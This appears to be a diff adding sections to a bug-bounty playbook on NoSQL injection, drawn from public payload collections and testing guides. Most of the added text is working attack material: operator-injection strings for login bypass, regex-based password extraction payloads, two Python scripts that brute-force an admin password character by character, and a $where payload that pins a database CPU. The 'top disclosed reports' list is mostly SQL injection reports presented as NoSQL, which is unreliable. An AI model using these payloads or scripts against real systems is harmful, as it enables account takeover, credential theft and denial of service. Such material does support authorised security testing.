@@ -1,7 +1,32 @@
 # Real-World Playbook — NoSQL Injection
 
 **Class:** `nosqli` · **Coverage-matrix tier:** 1 · **Hunter2:** /nosqli · tools/nosqli_scanner.py · **Skill:** web2-vuln-classes
-**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow)
+**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)
+
+## Why it pays (real bounty signal)
+Top disclosed NoSQL Injection reports peak at **$25,000**. Rewarded across: Eternal, GitHub Security Lab, Grab, Internet Bug Bounty, Mail.ru, Razer, Uber, Valve.
+
+## How real hackers found it — top disclosed reports
+*(title = the actual technique; open the report for the full PoC)*
+
+- **SQL Injection in report_xml.php through countryFilter[] parameter** — Valve, $25,000 · 407👍 · [383127](https://hackerone.com/reports/383127)
+- **Time-Based SQL injection at city-mobil.ru** — Mail.ru, $15,000 · 631👍 · [868436](https://hackerone.com/reports/868436)
+- **SQL injection at fleet.city-mobil.ru** — Mail.ru, $10,000 · 372👍 · [881901](https://hackerone.com/reports/881901)
+- **SQL Injection [unauthenticated] with direct output at https://news.mail.ru/** — Mail.ru, $7,500 · 156👍 · [818972](https://hackerone.com/reports/818972)
+- **[windows10.hi-tech.mail.ru]  Blind SQL Injection** — Mail.ru, $5,000 · 330👍 · [786044](https://hackerone.com/reports/786044)
+- **turboslim.lady.mail.ru - Blind sql-injection.** — Mail.ru, $5,000 · 93👍 · [795291](https://hackerone.com/reports/795291)
+- **SQL injection  delivery-club.ru (ClickHouse)** — Mail.ru, $5,000 · 76👍 · [1024773](https://hackerone.com/reports/1024773)
+- **[www.zomato.com] SQLi - /php/██████████ - item_id** — Eternal, $4,500 · 326👍 · [403616](https://hackerone.com/reports/403616)
+- **www.drivegrab.com SQL injection** — Grab, $4,500 · 203👍 · [273946](https://hackerone.com/reports/273946)
+- **C++: Support Pqxx connector to search for sql injections to Postgres** — GitHub Security Lab, $4,500 · 15👍 · [1241583](https://hackerone.com/reports/1241583)
+- **CVE-2024-42005: Potential SQL injection in QuerySet.values() and values_list()** — Internet Bug Bounty, $4,263 · 52👍 · [2646493](https://hackerone.com/reports/2646493)
+- **Blind SQL injection on id.indrive.com** — inDrive, $4,134 · 199👍 · [2051931](https://hackerone.com/reports/2051931)
+- **[api.easy2pay.co]  SQL Injection at fortumo via TransID parameter [Bypassing Signature Validation🔥]** — Razer, $4,000 · 232👍 · [894325](https://hackerone.com/reports/894325)
+- **SQL Injection on sctrack.email.uber.com.cn** — Uber, $4,000 · 93👍 · [150156](https://hackerone.com/reports/150156)
+- **Blind SQL injection on [city-mobil.ru/taxiserv/] in filter{"id_locality"}** — Mail.ru, $3,500 · 30👍 · [1133083](https://hackerone.com/reports/1133083)
+- **Blind SQL Injection on news.mail.ru** — Mail.ru, $3,000 · 52👍 · [732430](https://hackerone.com/reports/732430)
+- **SQL injection in Wordpress Plugin Huge IT Video Gallery at https://drive.uber.com/frmarketplace/** — Uber, $3,000 · 39👍 · [125932](https://hackerone.com/reports/125932)
+- **SQL injection in 3rd party software Anomali** — Uber, $2,500 · 61👍 · [206872](https://hackerone.com/reports/206872)
 
 ## Test flow / checklist — do these in order
 *(imported from Az0x7/vulnerability-Checklist; run each, mark result in the coverage matrix)*
@@ -777,6 +802,260 @@ username=admin&username=admin
 delete username=admin
 
 ```
+
+## Real payloads
+*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*
+
+### PayloadsAllTheThings
+```
+db.products.find({ "price": userInput })
+```
+```
+db.products.find({ "price": { "$gt": 0 } })
+```
+```
+  username[$ne]=toto&password[$ne]=toto
+  login[$regex]=a.*&pass[$ne]=lol
+  login[$gt]=admin&login[$lt]=test&pass[$ne]=1
+  login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
+```
+```
+  {"username": {"$ne": null}, "password": {"$ne": null}}
+  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+  {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+  {"username": {"$gt":""}, "password": {"$gt":""}}
+```
+```
+username[$ne]=toto&password[$regex]=.{1}
+username[$ne]=toto&password[$regex]=.{3}
+```
+```
+  username[$ne]=toto&password[$regex]=m.{2}
+  username[$ne]=toto&password[$regex]=md.{1}
+  username[$ne]=toto&password[$regex]=mdp
+
+  username[$ne]=toto&password[$regex]=m.*
+  username[$ne]=toto&password[$regex]=md.*
+```
+```
+  {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
+  {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
+  {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
+```
+```
+{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
+```
+```
+{"id":"10", "id":"100"} 
+```
+```
+import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username="admin"
+password=""
+u="http://example.org/login"
+headers={'content-type': 'application/json'}
+
+while True:
+    for c in string.printable:
+        if c not in ['*','+','.','?','|']:
+            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
+            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
+            if 'OK' in r.text or r.status_code == 302:
+                print("Found one more char : %s" % (password+c))
+                password += c
+```
+```
+import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username="admin"
+password=""
+u="http://example.org/login"
+headers={'content-type': 'application/x-www-form-urlencoded'}
+
+while True:
+    for c in string.printable:
+        if c not in ['*','+','.','?','|','&','$']:
+            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
+            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
+            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
+                print("Found one more char : %s" % (password+c))
+```
+
+## Real attacker flow / methodology
+*(how real hunters approach this class step by step)*
+
+### From OWASP WSTG (testing guide)
+### NoSQL Injection
+
+#### Summary
+
+NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax. Because these NoSQL injection attacks may execute within a [procedural language](https://en.wikipedia.org/wiki/Procedural_programming), rather than in the [declarative SQL language](https://en.wikipedia.org/wiki/Declarative_programming), the potential impacts are greater than traditional SQL injection.
+
+NoSQL database calls are written in the application's programming language, a custom API call, or formatted according to a common convention (such as `XML`, `JSON`, `LINQ`, etc). Malicious input targeting those specifications may not trigger the primarily application sanitization checks. For example, filtering out common HTML special characters such as `< > & ;` will not prevent attacks against a JSON API, where special characters include `/ { } :`.
+
+There are hundreds of NoSQL databases available for use within an application, providing APIs in a variety of languages and relationship models. Each offers different features and restrictions. Because there is not a common language between them, example injection code will not apply across all NoSQL databases. For this reason, anyone testing for NoSQL injection attacks will need to familiarize themselves with the syntax, data model, and underlying programming language in order to craft specific tests.
+
+NoSQL injection attacks may execute in different areas of an application than traditional SQL injection. Where SQL injection would execute within the database engine, NoSQL variants may execute during within the application layer or the database layer, depending on the NoSQL API used and data model. Typically NoSQL injection attacks will execute where the attack string is parsed, evaluated, or concatenated into a NoSQL API call.
+
+Additional timing attacks may be relevant to the lack of concurrency checks within a NoSQL database. These are not covered under injection testing. At the time of writing MongoDB is the most widely used NoSQL database, and so all examples will feature MongoDB APIs.
+
+#### How to Test
+
+##### NoSQL Injection Vulnerabilities in MongoDB
+
+The MongoDB API expects BSON (Binary JSON) calls, and includes a secure BSON query assembly tool. However, according to MongoDB documentation - unserialized JSON and [JavaScript expressions](https://docs.mongodb.org/manual/faq/developers/#javascript) are permitted in several alternative query parameters. The most commonly used API call allowing arbitrary JavaScript input is the `$where` operator.
+
+The MongoDB `$where` operator typically is used as a simple filter or check, as it is within SQL.
+
+`db.myCollection.find( { $where: "this.credits`` ``==`` ``this.debits" } );`
+
+Optionally JavaScript is also evaluated to allow more advanced conditions.
+
+`db.myCollection.find( { $where: function() { return obj.credits - obj.debits < 0; } } );`
+
+##### Example 1
+
+If an attacker were able to manipulate the data passed into the `$where` operator, that attacker could include arbitrary JavaScript to be evaluated as part of the MongoDB query. An example vulnerability is exposed in the following code, if user input is passed directly into the MongoDB query without sanitization.
+
+`db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits < $userInput; } } );;`
+
+As with testing other types of injection, one does not need to fully exploit the vulnerability to demonstrate a problem. By injecting special characters relevant to the target API language, and observing the results, a tester can determine if the application correctly sanitized the input. For example within MongoDB, if a string containing any of the following special characters were passed unsanitized, it would trigger a database error.
+
+`' " \ ; { }`
+
+With normal SQL injection, a similar vulnerability would allow an attacker to execute arbitrary SQL commands - exposing or manipulating data at will. However, because JavaScript is a fully featured language, not only does this allow an attacker to manipulate data, but also to run arbitrary code. For example, instead of just causing an error when testing, a full exploit would use the special characters to craft valid JavaScript.
+
+This input `0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000)` inserted into `$userInput` in the above example code would result in the following JavaScript function being executed. This specific attack string would case the entire MongoDB instance to execute at 100% CPU usage for 10 second.
+
+`function() { return obj.credits - obj.debits < 0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000); }`
+
+##### Example 2
+
+Even if the input used within queries is completely sanitized or parameterized, there is an alternate path in which one might trigger NoSQL injection. Many NoSQL instances have their own reserved variable names, independent of the application programming language.
+
+For example within MongoDB, the `$where` syntax itself is a reserved query operator. It needs to be passed into the query exactly as shown; any alteration would cause a database error. However, because `$where` is also a valid PHP variable name, it may be possible for an attacker to insert code into the query by creating a PHP variable named `$where`. The PHP MongoDB documentation explicitly warns developers:
+
+> Please make sure that for all special query operators (starting with `$`) you use single quotes so that PHP doesn't try to replace `$exists` with the value of the variable `$exists`.
+
+Even if a query depended on no user input, such as the following example, an attacker could exploit MongoDB by replacing the operator with malicious data.
+
+`db.myCollection.find( { $where: function() { return obj.credits - obj.debits < 0; } } );`
+
+One way to potentially assign data to PHP variables is via HTTP Parameter Pollution (see: [HTTP Parameter pollution](04-HTTP_Parameter_Pollution.md)). By creating a variable named `$where` via parameter pollution, one could trigger a MongoDB error indicating that the query is no longer valid. Any value of `$where` other than the string `$where` itself, should suffice to demonstrate vulnerability. An attacker would develop a full exploit by inserting the following:
+
+`$where: function() { //arbitrary JavaScript here }`
+
+
+*(truncated — open the source link for the full method)*
+
+### From AllAboutBugBounty
+#### NoSQL injection
+
+#### Introduction
+NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.
+
+#### How to Exploit
+##### Authentication Bypass
+
+Basic authentication bypass using not equal ($ne) or greater ($gt)
+
+```
+in the request
+- username[$ne]=toto&password[$ne]=toto
+- login[$regex]=a.*&pass[$ne]=lol
+- login[$gt]=admin&login[$lt]=test&pass[$ne]=1
+- login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
+```
+
+```json
+The output is
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username": {"$gt":""}, "password": {"$gt":""}}
+```
+
+##### Extract length information
+
+```json
+username[$ne]=toto&password[$regex]=.{1}
+username[$ne]=toto&password[$regex]=.{3}
+```
+
+##### Extract data information
+
+```json
+in URL
+username[$ne]=toto&password[$regex]=m.{2}
+username[$ne]=toto&password[$regex]=md.{1}
+username[$ne]=toto&password[$regex]=mdp
+
+username[$ne]=toto&password[$regex]=m.*
+username[$ne]=toto&password[$regex]=md.*
+
+in JSON
+{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
+```
+
+##### Extract data with "in"
+
+```json
+{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
+```
+
+##### PHP Arbitrary Function Execution
+```json
+"user":{"$func": "var_dump"}
+```
+
+#### Blind NoSQL
+
+##### POST
+
+```python
+import requests
+import urllib3
+import string
+import urllib
+
+*(truncated — open the source link for the full method)*
+
+### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
+### NoSQL injection
+
+
+#### Exploit
+
+In PHP, a client can submit an array by changing a parameter from _`parameter=foo`_ to _`parameter[arrName]=foo`_.
+
+These payloads inject a database **operator**:<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup>
+
+```bash
+username[$ne]=1$password[$ne]=1 #<Not Equals>
+username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
+username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
+username[$eq]=admin&password[$ne]=1 #<Equals>
+username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
+username[$ne]=admin&pass[$gt]=s #<Greater Than>
+username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
+{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
+```
+
+##### Basic authentication bypass
+
+
+*(truncated — open the source link for the full method)*
 
 ## Chaining — always ask "what does this unlock?"
 - Operator injection ($ne/$gt) at login → auth bypass → ATO
